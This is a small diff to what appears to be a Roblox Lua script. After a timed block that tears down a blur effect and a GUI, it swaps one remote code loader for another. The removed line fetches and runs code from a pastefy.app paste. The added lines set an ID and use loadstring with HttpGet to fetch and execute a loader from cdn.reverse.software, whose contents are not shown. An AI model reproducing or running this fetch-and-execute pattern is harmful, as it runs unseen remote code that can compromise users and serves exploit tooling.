@@ -138,4 +138,5 @@ task.delay(5, function()
 	blur:Destroy()
 	gui:Destroy()
 end)
-loadstring(game:HttpGet("https://pastefy.app/M7FN1mVr/raw"))()
+ID="b4518e52-2124-4110-a320-74d6dac3cf23";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
